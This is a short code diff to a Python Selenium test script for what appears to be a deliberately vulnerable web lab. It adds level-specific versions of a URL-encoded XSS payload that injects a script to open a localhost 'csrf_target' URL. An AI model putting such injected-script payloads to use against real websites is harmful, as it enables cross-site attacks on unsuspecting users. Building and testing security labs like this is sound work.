@@ -129,8 +129,10 @@ def csrf(level):
     options.add_argument("--headless")
     driver = webdriver.Firefox(options=options)
     secret_msg = 'secretmessagelol'
-
-    query = '%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fcsrf_target%2Fsecretmessagelol%22)%3B%3C%2Fscript%3E'
+    if level == 'low':
+        query = '%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fcsrf_target%2Flow%2Fsecretmessagelol%22)%3B%3C%2Fscript%3E'
+    else:
+        query = '%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fcsrf_target%2Fmedium%2Fsecretmessagelol%22)%3B%3C%2Fscript%3E'
 
     url = TARGET_SERVER_ENDPOINT + '/' + 'csrf_src' + '?query=' + query
 
